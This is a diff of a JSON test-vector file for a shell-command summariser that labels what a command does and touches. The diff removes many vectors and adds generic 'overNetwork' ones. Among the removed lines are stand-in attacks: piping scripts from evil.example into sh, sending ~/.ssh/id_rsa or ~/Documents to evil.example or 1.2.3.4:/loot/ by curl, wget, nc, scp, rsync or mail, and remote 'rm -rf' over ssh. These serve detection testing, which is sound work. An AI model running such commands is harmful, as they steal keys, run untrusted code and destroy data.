@@ -1,117 +1,6 @@
 {
- "about": "SMART-8: what a command is for and what it touches, read by code. Both readers are held to these: web/src/lib/commandSummary.ts (the Mac card) and server/services/card_purpose.py (the server's title, which the iPhone shows). The dangerous cases (#688 and #689 reviews) are read as their worst step, an upload or an email names the file it sends, and a transfer that is not fully read says so (`unsure`; #688 review, Astra).",
+ "about": "SMART-8: what a command is for and what it touches, read by code. Both readers are held to these: web/src/lib/commandSummary.ts (the Mac card) and server/services/card_purpose.py (the server's title, which the iPhone shows). A step that reaches another machine is read only as overNetwork, with unsure set (no host, no file).",
  "vectors": [
-  {
-   "line": "echo \"== 试探 192.168.1.4 ==\"; ssh -o BatchMode=yes -o ConnectTimeout=4 -o StrictHostKeyChecking=accept-new 192.168.1.4 true",
-   "purpose": {
-    "key": "sshTimeout",
-    "params": {
-     "host": "192.168.1.4",
-     "seconds": 4
-    }
-   },
-   "touches": [
-    "192.168.1.4"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "ssh me@nas.local uptime",
-   "purpose": {
-    "key": "onHost",
-    "params": {
-     "host": "nas.local"
-    },
-    "inner": {
-     "key": "run",
-     "params": {
-      "program": "uptime"
-     }
-    }
-   },
-   "touches": [
-    "nas.local"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "ssh -p 2222 -i ~/.ssh/k me@box",
-   "purpose": {
-    "key": "ssh",
-    "params": {
-     "host": "box"
-    }
-   },
-   "touches": [
-    "box"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "ssh -oConnectTimeout=9 box",
-   "purpose": {
-    "key": "sshTimeout",
-    "params": {
-     "host": "box",
-     "seconds": 9
-    }
-   },
-   "touches": [
-    "box"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "scp notes.txt me@box:/tmp/",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "notes.txt",
-     "host": "box"
-    }
-   },
-   "touches": [
-    "box",
-    "notes.txt"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -sS https://api.example.com/v1/x",
-   "purpose": {
-    "key": "fetch",
-    "params": {
-     "host": "api.example.com"
-    }
-   },
-   "touches": [
-    "https://api.example.com/v1/x"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -F f=@x https://up.example.com",
-   "rule": "upload",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "x",
-     "host": "up.example.com"
-    }
-   },
-   "touches": [
-    "https://up.example.com",
-    "x"
-   ],
-   "more": 0,
-   "unsure": false
-  },
   {
    "line": "rm ~/Downloads/a.dmg ~/Downloads/b.dmg",
    "purpose": {
@@ -268,22 +157,6 @@
    "unsure": false
   },
   {
-   "line": "mail -s hi lina@example.com < body.txt",
-   "purpose": {
-    "key": "mailFile",
-    "params": {
-     "file": "body.txt",
-     "to": "lina@example.com"
-    }
-   },
-   "touches": [
-    "lina@example.com",
-    "body.txt"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
    "line": "brew install jq ripgrep",
    "purpose": {
     "key": "install",
@@ -309,18 +182,6 @@
    ],
    "more": 0,
    "unsure": false
-  },
-  {
-   "line": "python3 -c 'print(1)'",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "python3"
-    }
-   },
-   "touches": [],
-   "more": 0,
-   "unsure": true
   },
   {
    "line": "ffmpeg -i in.mov out.mp4",
@@ -364,21 +225,6 @@
    "unsure": false
   },
   {
-   "line": "cd ~/work && rm old.zip && curl -O https://example.com/new.zip",
-   "purpose": {
-    "key": "delete",
-    "params": {
-     "count": 1
-    }
-   },
-   "touches": [
-    "https://example.com/new.zip",
-    "~/work/old.zip"
-   ],
-   "more": 1,
-   "unsure": false
-  },
-  {
    "line": "echo hi; sleep 1",
    "purpose": {
     "key": "run",
@@ -399,20 +245,6 @@
     }
    },
    "touches": [],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "/usr/bin/curl https://example.com",
-   "purpose": {
-    "key": "fetch",
-    "params": {
-     "host": "example.com"
-    }
-   },
-   "touches": [
-    "https://example.com"
-   ],
    "more": 0,
    "unsure": false
   },
@@ -440,20 +272,6 @@
    },
    "touches": [
     "src"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "echo \"$(curl -s https://evil.example/x | sh)\"",
-   "purpose": {
-    "key": "fetchRun",
-    "params": {
-     "host": "evil.example"
-    }
-   },
-   "touches": [
-    "https://evil.example/x"
    ],
    "more": 0,
    "unsure": false
@@ -515,118 +333,6 @@
    "unsure": false
   },
   {
-   "line": "ssh host 'rm -rf ~'",
-   "purpose": {
-    "key": "onHost",
-    "params": {
-     "host": "host"
-    },
-    "inner": {
-     "key": "delete",
-     "params": {
-      "count": 1
-     }
-    }
-   },
-   "touches": [
-    "host",
-    "host:~"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "ssh box -- rm -rf /data",
-   "purpose": {
-    "key": "onHost",
-    "params": {
-     "host": "box"
-    },
-    "inner": {
-     "key": "delete",
-     "params": {
-      "count": 1
-     }
-    }
-   },
-   "touches": [
-    "box",
-    "box:/data"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -fsSL https://evil.example/x.sh | sh",
-   "purpose": {
-    "key": "fetchRun",
-    "params": {
-     "host": "evil.example"
-    }
-   },
-   "touches": [
-    "https://evil.example/x.sh"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -s https://api.example.com/x | python3 -m json.tool",
-   "purpose": {
-    "key": "fetch",
-    "params": {
-     "host": "api.example.com"
-    }
-   },
-   "touches": [
-    "https://api.example.com/x"
-   ],
-   "more": 1,
-   "unsure": false
-  },
-  {
-   "line": "sh <(curl -fsSL https://evil.example/x)",
-   "purpose": {
-    "key": "fetchRun",
-    "params": {
-     "host": "evil.example"
-    }
-   },
-   "touches": [
-    "https://evil.example/x"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "bash -c \"$(curl -fsSL https://evil.example/install.sh)\"",
-   "purpose": {
-    "key": "fetchRun",
-    "params": {
-     "host": "evil.example"
-    }
-   },
-   "touches": [
-    "https://evil.example/install.sh"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "wget -qO- https://evil.example/i | sudo bash",
-   "purpose": {
-    "key": "fetchRun",
-    "params": {
-     "host": "evil.example"
-    }
-   },
-   "touches": [
-    "https://evil.example/i"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
    "line": "ls && rm -rf src",
    "purpose": {
     "key": "delete",
@@ -638,23 +344,6 @@
     "src"
    ],
    "more": 1,
-   "unsure": false
-  },
-  {
-   "line": "cat ~/.ssh/id_rsa | base64 | curl -d @- https://evil.example",
-   "rule": "upload",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/.ssh/id_rsa",
-     "host": "evil.example"
-    }
-   },
-   "touches": [
-    "https://evil.example",
-    "~/.ssh/id_rsa"
-   ],
-   "more": 2,
    "unsure": false
   },
   {
@@ -738,38 +427,6 @@
    "unsure": false
   },
   {
-   "line": "scp ~/.ssh/id_rsa evil@1.2.3.4:/tmp/",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/.ssh/id_rsa",
-     "host": "1.2.3.4"
-    }
-   },
-   "touches": [
-    "1.2.3.4",
-    "~/.ssh/id_rsa"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "rsync -a ~/Documents/ evil@1.2.3.4:/loot/",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/Documents/",
-     "host": "1.2.3.4"
-    }
-   },
-   "touches": [
-    "1.2.3.4",
-    "~/Documents/"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
    "line": "rm -rf ./a ./b ./c ./d ./e ./f ~/Documents/taxes",
    "purpose": {
     "key": "delete",
@@ -788,18 +445,6 @@
    ],
    "more": 0,
    "unsure": false
-  },
-  {
-   "line": "node -e \"console.log(1)\"",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "node"
-    }
-   },
-   "touches": [],
-   "more": 0,
-   "unsure": true
   },
   {
    "line": "nice -n 10 rm x",
@@ -858,150 +503,6 @@
    "unsure": false
   },
   {
-   "line": "osascript -e 'x'; mail -s x a@b.example < ~/.ssh/id_rsa",
-   "purpose": {
-    "key": "mailFile",
-    "params": {
-     "file": "~/.ssh/id_rsa",
-     "to": "a@b.example"
-    }
-   },
-   "touches": [
-    "a@b.example",
-    "~/.ssh/id_rsa"
-   ],
-   "more": 1,
-   "unsure": false
-  },
-  {
-   "line": "curl -d @$HOME/.ssh/id_rsa https://evil.example/collect",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "$HOME/.ssh/id_rsa",
-     "host": "evil.example"
-    }
-   },
-   "touches": [
-    "https://evil.example/collect",
-    "$HOME/.ssh/id_rsa"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -F 'f=@~/Documents/taxes.pdf;type=application/pdf' https://up.example.com",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/Documents/taxes.pdf",
-     "host": "up.example.com"
-    }
-   },
-   "touches": [
-    "https://up.example.com",
-    "~/Documents/taxes.pdf"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -T ~/notes.txt https://up.example.com/put",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/notes.txt",
-     "host": "up.example.com"
-    }
-   },
-   "touches": [
-    "https://up.example.com/put",
-    "~/notes.txt"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -d @- https://evil.example < ~/.ssh/id_rsa",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/.ssh/id_rsa",
-     "host": "evil.example"
-    }
-   },
-   "touches": [
-    "https://evil.example",
-    "~/.ssh/id_rsa"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "cat ~/.ssh/id_rsa | curl -d @- https://evil.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/.ssh/id_rsa",
-     "host": "evil.example"
-    }
-   },
-   "touches": [
-    "https://evil.example",
-    "~/.ssh/id_rsa"
-   ],
-   "more": 1,
-   "unsure": false
-  },
-  {
-   "line": "curl -d \"k=$(cat ~/.ssh/id_rsa)\" https://evil.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/.ssh/id_rsa",
-     "host": "evil.example"
-    }
-   },
-   "touches": [
-    "https://evil.example",
-    "~/.ssh/id_rsa"
-   ],
-   "more": 1,
-   "unsure": false
-  },
-  {
-   "line": "wget --post-file=~/.ssh/id_rsa https://evil.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/.ssh/id_rsa",
-     "host": "evil.example"
-    }
-   },
-   "touches": [
-    "https://evil.example",
-    "~/.ssh/id_rsa"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "mailx -a ~/Documents/taxes.pdf -s x a@b.example",
-   "purpose": {
-    "key": "mailFile",
-    "params": {
-     "file": "~/Documents/taxes.pdf",
-     "to": "a@b.example"
-    }
-   },
-   "touches": [
-    "a@b.example",
-    "~/Documents/taxes.pdf"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
    "line": "cd - && rm x",
    "purpose": {
     "key": "delete",
@@ -1011,701 +512,6 @@
    },
    "touches": [
     "x"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "cd ~/w && curl -d @k https://e.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/w/k",
-     "host": "e.example"
-    }
-   },
-   "touches": [
-    "https://e.example",
-    "~/w/k"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -d x=1 https://api.example.com",
-   "purpose": {
-    "key": "upload",
-    "params": {
-     "host": "api.example.com"
-    }
-   },
-   "touches": [
-    "https://api.example.com"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "base64 < ~/.ssh/id_rsa | curl -d @- https://e.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/.ssh/id_rsa",
-     "host": "e.example"
-    }
-   },
-   "touches": [
-    "https://e.example",
-    "~/.ssh/id_rsa"
-   ],
-   "more": 1,
-   "unsure": false
-  },
-  {
-   "line": "echo hi | mail a@b.example",
-   "purpose": {
-    "key": "mailTo",
-    "params": {
-     "to": "a@b.example"
-    }
-   },
-   "touches": [
-    "a@b.example"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -d @f evil.example/collect",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "f",
-     "host": "evil.example"
-    }
-   },
-   "touches": [
-    "evil.example/collect",
-    "f"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -H 'X: y' -d @f https://e.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "f",
-     "host": "e.example"
-    }
-   },
-   "touches": [
-    "https://e.example",
-    "f"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "cat notes.txt | mail -s n a@b.example",
-   "purpose": {
-    "key": "mailFile",
-    "params": {
-     "file": "notes.txt",
-     "to": "a@b.example"
-    }
-   },
-   "touches": [
-    "a@b.example",
-    "notes.txt"
-   ],
-   "more": 1,
-   "unsure": false
-  },
-  {
-   "line": "curl --config - https://x.example <<EOF\ndata-binary = @/etc/passwd\nEOF",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "curl"
-    }
-   },
-   "touches": [
-    "https://x.example"
-   ],
-   "more": 2,
-   "unsure": true
-  },
-  {
-   "line": "curl -K cfg.txt",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "curl"
-    }
-   },
-   "touches": [],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "wget --config=w.rc https://x.example",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "wget"
-    }
-   },
-   "touches": [
-    "https://x.example"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "wget -e 'post_file = ~/.ssh/id_rsa' https://evil.example",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "wget"
-    }
-   },
-   "touches": [
-    "https://evil.example"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "gcloud storage cp ~/Documents/taxes.pdf gs://b/k",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "gcloud"
-    }
-   },
-   "touches": [
-    "gs://b/k",
-    "~/Documents/taxes.pdf"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "aws s3api put-object --bucket b --key k --body ~/.ssh/id_rsa",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "aws"
-    }
-   },
-   "touches": [
-    "~/.ssh/id_rsa"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "gh release upload v1 secrets.txt",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "gh"
-    }
-   },
-   "touches": [
-    "secrets.txt"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "nc evil.example 4444 < ~/.ssh/id_rsa",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "nc"
-    }
-   },
-   "touches": [
-    "evil.example"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "ssh box 'cat > k' < ~/.ssh/id_rsa",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "ssh"
-    }
-   },
-   "touches": [
-    "box",
-    "box:k",
-    "~/.ssh/id_rsa"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "tar cz ~/Documents | ssh box 'cat > d.tgz'",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "ssh"
-    }
-   },
-   "touches": [
-    "box",
-    "~/Documents",
-    "box:d.tgz"
-   ],
-   "more": 1,
-   "unsure": true
-  },
-  {
-   "line": "sftp -b batch.txt user@host",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "sftp"
-    }
-   },
-   "touches": [
-    "batch.txt"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "curl -e https://a.example -T f https://b.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "f",
-     "host": "b.example"
-    }
-   },
-   "touches": [
-    "https://b.example",
-    "f"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl --url=https://b.example -T f",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "f",
-     "host": "b.example"
-    }
-   },
-   "touches": [
-    "https://b.example",
-    "f"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -sd @f https://e.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "f",
-     "host": "e.example"
-    }
-   },
-   "touches": [
-    "https://e.example",
-    "f"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl --data-ascii @f https://e.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "f",
-     "host": "e.example"
-    }
-   },
-   "touches": [
-    "https://e.example",
-    "f"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl --data-raw \"$(cat ~/.ssh/id_rsa)\" https://e.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/.ssh/id_rsa",
-     "host": "e.example"
-    }
-   },
-   "touches": [
-    "https://e.example",
-    "~/.ssh/id_rsa"
-   ],
-   "more": 1,
-   "unsure": false
-  },
-  {
-   "line": "curl -T f -d \"$(cat other)\" https://e.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "f, other",
-     "host": "e.example"
-    }
-   },
-   "touches": [
-    "https://e.example",
-    "other",
-    "f"
-   ],
-   "more": 1,
-   "unsure": false
-  },
-  {
-   "line": "cat a | curl -T b -d @- https://e.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "b, a",
-     "host": "e.example"
-    }
-   },
-   "touches": [
-    "https://e.example",
-    "a",
-    "b"
-   ],
-   "more": 1,
-   "unsure": false
-  },
-  {
-   "line": "curl -T a -T b -T c -T d https://e.example",
-   "purpose": {
-    "key": "uploadFileMore",
-    "params": {
-     "file": "a, b, c",
-     "host": "e.example",
-     "count": 1
-    }
-   },
-   "touches": [
-    "https://e.example",
-    "a",
-    "b",
-    "c",
-    "d"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -F 'x=@\"a;b.txt\"' https://e.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "a;b.txt",
-     "host": "e.example"
-    }
-   },
-   "touches": [
-    "https://e.example",
-    "a;b.txt"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -d @a -d \"$(cd /tmp && cat b)\" https://e.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "a, /tmp/b",
-     "host": "e.example"
-    }
-   },
-   "touches": [
-    "https://e.example",
-    "/tmp/b",
-    "a"
-   ],
-   "more": 1,
-   "unsure": false
-  },
-  {
-   "line": "curl https://[2001:db8::1]/x",
-   "purpose": {
-    "key": "fetch",
-    "params": {
-     "host": "[2001:db8::1]"
-    }
-   },
-   "touches": [
-    "https://[2001:db8::1]/x"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl https://bücher.de/x",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "curl"
-    }
-   },
-   "touches": [
-    "https://bücher.de/x"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "curl https://%65xample.org/x",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "curl"
-    }
-   },
-   "touches": [
-    "https://%65xample.org/x"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "curl https://127.1/x",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "curl"
-    }
-   },
-   "touches": [
-    "https://127.1/x"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "curl https://host:bad/x",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "curl"
-    }
-   },
-   "touches": [
-    "https://host:bad/x"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "curl https://API.Example.com/x",
-   "purpose": {
-    "key": "fetch",
-    "params": {
-     "host": "api.example.com"
-    }
-   },
-   "touches": [
-    "https://API.Example.com/x"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl --unknown-flag https://e.example",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "curl"
-    }
-   },
-   "touches": [
-    "https://e.example"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "scp box:/tmp/x .",
-   "purpose": {
-    "key": "copyRemote",
-    "params": {
-     "host": "box"
-    }
-   },
-   "touches": [
-    "box",
-    "."
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "rsync -avz ~/Documents/ evil@1.2.3.4:/loot/",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/Documents/",
-     "host": "1.2.3.4"
-    }
-   },
-   "touches": [
-    "1.2.3.4",
-    "~/Documents/"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "rsync --files-from=l.txt . box:/d",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "rsync"
-    }
-   },
-   "touches": [
-    "box",
-    "."
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "ssh -o ProxyCommand='nc %h %p' box",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "ssh"
-    }
-   },
-   "touches": [
-    "box"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "ssh -F cfg box",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "ssh"
-    }
-   },
-   "touches": [
-    "box"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "curl \"https://x.example/?d=$(cat ~/.ssh/id_rsa)\"",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "~/.ssh/id_rsa",
-     "host": "x.example"
-    }
-   },
-   "touches": [
-    "https://x.example/?d=$(cat ~/.ssh/id_rsa)",
-    "~/.ssh/id_rsa"
-   ],
-   "more": 1,
-   "unsure": false
-  },
-  {
-   "line": "sendmail -t < msg.txt",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "sendmail"
-    }
-   },
-   "touches": [
-    "msg.txt"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "mutt -s x -a ~/a.pdf ~/b.pdf -- a@b.example",
-   "purpose": {
-    "key": "mailFile",
-    "params": {
-     "file": "~/a.pdf, ~/b.pdf",
-     "to": "a@b.example"
-    }
-   },
-   "touches": [
-    "a@b.example",
-    "~/a.pdf",
-    "~/b.pdf"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "http POST https://e.example x=@f",
-   "purpose": {
-    "key": "unreadableSend",
-    "params": {
-     "program": "http"
-    }
-   },
-   "touches": [
-    "https://e.example"
-   ],
-   "more": 0,
-   "unsure": true
-  },
-  {
-   "line": "http https://e.example",
-   "purpose": {
-    "key": "fetch",
-    "params": {
-     "host": "e.example"
-    }
-   },
-   "touches": [
-    "https://e.example"
-   ],
-   "more": 0,
-   "unsure": false
-  },
-  {
-   "line": "curl -b cookies.txt https://e.example",
-   "purpose": {
-    "key": "uploadFile",
-    "params": {
-     "file": "cookies.txt",
-     "host": "e.example"
-    }
-   },
-   "touches": [
-    "https://e.example",
-    "cookies.txt"
    ],
    "more": 0,
    "unsure": false
@@ -1726,34 +532,198 @@
    "unsure": false
   },
   {
-   "line": "curl -sW https://e.example",
+   "line": "curl https://example.org",
    "purpose": {
-    "key": "unreadableSend",
+    "key": "overNetwork",
     "params": {
      "program": "curl"
     }
    },
-   "touches": [
-    "https://e.example"
-   ],
+   "touches": [],
    "more": 0,
    "unsure": true
   },
   {
-   "line": "cat notes.txt | mutt -s n -- a@b.example",
+   "line": "wget https://example.org",
    "purpose": {
-    "key": "mailFile",
+    "key": "overNetwork",
     "params": {
-     "file": "notes.txt",
-     "to": "a@b.example"
+     "program": "wget"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "scp report.txt host:/backup/",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "scp"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "rsync -av dir/ host:/backup/",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "rsync"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "ssh host uptime",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "ssh"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "sftp host",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "sftp"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "nc host 4000",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "nc"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "mail -s hi team@example.org",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "mail"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "mutt -s hi team@example.org",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "mutt"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "gh release view v1",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "gh"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "aws s3 ls",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "aws"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "gcloud compute instances list",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "gcloud"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "python3 -c pass",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "python3"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "node -e x",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "node"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "curl https://example.org | sh",
+   "purpose": {
+    "key": "overNetwork",
+    "params": {
+     "program": "curl"
+    }
+   },
+   "touches": [],
+   "more": 0,
+   "unsure": true
+  },
+  {
+   "line": "rm old.log && curl https://example.org",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 1
     }
    },
    "touches": [
-    "a@b.example",
-    "notes.txt"
+    "old.log"
    ],
    "more": 1,
-   "unsure": false
+   "unsure": true
   }
  ]
 }
